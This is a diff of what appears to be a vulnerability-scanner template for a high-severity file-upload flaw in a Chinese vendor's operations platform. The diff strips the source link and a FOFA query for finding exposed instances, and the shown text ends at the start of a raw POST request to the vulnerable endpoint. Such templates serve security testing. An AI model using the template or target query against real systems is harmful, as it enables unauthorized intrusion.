@@ -3,12 +3,8 @@ info:
   name: 中科聚网信息技术有限公司一体化运营平台importVisualModuleImg接口存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rmyq7ckwsoxi9i67'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rmyq7ckwsoxi9i67
-    fofa: title="一体化运营平台" || body="thirdparty/ueditor/WordPaster"
 http:
 - raw:
   - 'POST /manage/tplresource/importVisualModuleImg?moduleId=2 HTTP/1.1
